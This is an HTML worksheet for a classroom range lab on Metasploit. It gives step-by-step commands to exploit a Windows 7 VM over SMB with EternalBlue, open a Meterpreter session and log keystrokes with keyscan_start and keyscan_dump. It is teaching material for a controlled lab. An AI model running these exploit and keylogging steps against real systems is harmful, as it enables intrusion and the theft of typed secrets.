@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lab 8.4.1 - Metasploit Framework</title>
+    <link rel="stylesheet" href="lab.css">
+</head>
+
+<body>
+
+    <a href="../index.html" class="dashboard-link">&larr; Back to Dashboard</a>
+
+    <div class="container">
+        <header>
+            <div>
+                <h1>Lab 8.4.1 - Metasploit Framework</h1>
+                <p style="margin: 5px 0 0; color: var(--secondary);">CYBER.ORG Range Worksheet</p>
+            </div>
+            <img src="../images/cyber.org_logo2.jpg" alt="Logo" style="height: 40px; opacity: 0.8;">
+        </header>
+
+        <div class="meta-info">
+            <div class="form-group">
+                <label for="studentName">Student Name:</label>
+                <input type="text" id="studentName" placeholder="Enter your name">
+            </div>
+            <div class="form-group">
+                <label for="date">Date:</label>
+                <input type="text" id="date" placeholder="Enter date">
+            </div>
+            <div class="form-group">
+                <label for="class">Class:</label>
+                <input type="text" id="class" placeholder="Enter class name">
+            </div>
+            <div class="form-group">
+                <label for="partner">Partner Name:</label>
+                <input type="text" id="partner" placeholder="Enter partner name">
+            </div>
+        </div>
+
+        <!-- Objectives -->
+        <div class="section">
+            <h2>Objectives</h2>
+            <div class="instruction-text">
+                1. Demonstrate how a Service can be mal-used as a vector for exploits. (SMB protocol on ports
+                139/445).<br>
+                2. Examine a typical exploit using the Metasploit application and the Meterpreter payload module.
+            </div>
+
+            <h3>Instructions:</h3>
+            <ul>
+                <li>Go to CYBER.ORG Range (https://apps.cyber.org)</li>
+                <li>Launch Kali and Windows 7. Open Windows 7.</li>
+                <li><strong>Turn off Windows 7 Firewall:</strong> Start > "Firewall" > Turn Windows Firewall On or Off >
+                    Select "Turn off..." for both Network locations > OK.</li>
+            </ul>
+        </div>
+
+        <!-- Part 1 -->
+        <div class="section">
+            <h2>Part 1: Using Metasploit</h2>
+            <div class="instruction-text">
+                1. Open a terminal in Kali and start Metasploit:
+                <pre style="background:#f4f4f4; padding:10px; border-radius:4px;">sudo msfconsole</pre>
+            </div>
+
+            <div class="question-block">
+                <label>2. Paste a screenshot of the Metasploit banner/prompt:</label>
+                <div class="image-zone" tabindex="0" id="img-zone-1">
+                    <p>Click here and press <strong>Ctrl + V</strong> (or Cmd + V) to paste your screenshot.</p>
+                </div>
+            </div>
+
+            <div class="instruction-text">
+                3. The target victim has port 445 open (SMB). Type the following to select the EternalBlue exploit:
+                <pre
+                    style="background:#f4f4f4; padding:10px; border-radius:4px;">use exploit/windows/smb/ms17_010_eternalblue</pre>
+
+                4. Configure options. Type <code>show options</code> to see what is needed. Then type:
+                <pre style="background:#f4f4f4; padding:10px; border-radius:4px;">
+set RHOSTS &lt;your Windows 7 IP address&gt;
+set SMBUser windows
+set SMBPass password
+                </pre>
+
+                5. Launch the exploit:
+                <pre style="background:#f4f4f4; padding:10px; border-radius:4px;">exploit</pre>
+                Wait a few seconds for the connection. Ignore "Service start timed out" messages.
+            </div>
+        </div>
+
+        <!-- Part 2 -->
+        <div class="section">
+            <h2>Part 2: The Meterpreter Session</h2>
+            <div class="instruction-text">
+                The prompt changes to <code>meterpreter ></code>. You are now inside the target.<br>
+                1. Type: <code>pwd</code> and <code>sysinfo</code>.
+            </div>
+
+            <div class="question-block">
+                <label for="q1">What is the result of pwd?</label>
+                <input type="text" id="q1" placeholder="Enter path">
+            </div>
+            <div class="question-block">
+                <label for="q1b">What is the OS Build number?</label>
+                <input type="text" id="q1b" placeholder="Enter build number">
+            </div>
+
+            <div class="instruction-text">
+                2. Type <code>help</code> to see command options.<br>
+                3. <strong>Keylogger:</strong> Switch to Windows 7 and open <strong>Notepad</strong>.<br>
+                4. Return to Kali. Type <code>ps</code> and find the PID for <code>notepad.exe</code>.<br>
+                5. Migrate to the Notepad process and start logging:
+                <pre style="background:#f4f4f4; padding:10px; border-radius:4px;">
+migrate &lt;PID number&gt;
+keyscan_start
+                </pre>
+                6. Switch to Windows 7, type a secret sentence in Notepad. Return to Kali and dump the keys:
+                <code>keyscan_dump</code>
+            </div>
+
+            <div class="question-block">
+                <label>Paste a screenshot of the keyscan_dump results showing your typed text:</label>
+                <div class="image-zone" tabindex="0" id="img-zone-2">
+                    <p>Click here and press <strong>Ctrl + V</strong> (or Cmd + V) to paste your screenshot.</p>
+                </div>
+            </div>
+
+            <div class="instruction-text">
+                To close the keylogger type: <code>keyscan_stop</code>
+            </div>
+        </div>
+
+        <!-- Closing Questions -->
+        <div class="section" style="border-bottom: none;">
+            <h2>Closing Question</h2>
+
+            <div class="question-block">
+                <label for="q4">Review the commands in Meterpreter Help. Identify which command lists would be most
+                    useful for attacking and, of those commands, identify one that would be useful to attack the
+                    <strong>Availability</strong> of the files on Windows 7. Explain your answer.</label>
+                <textarea id="q4" rows="4" placeholder="Explain your answer..."></textarea>
+            </div>
+        </div>
+
+    </div>
+
+    <div class="controls">
+        <button class="btn" onclick="window.print()">Save as PDF / Print</button>
+    </div>
+
+    <script src="lab.js"></script>
+</body>
+
+</html>
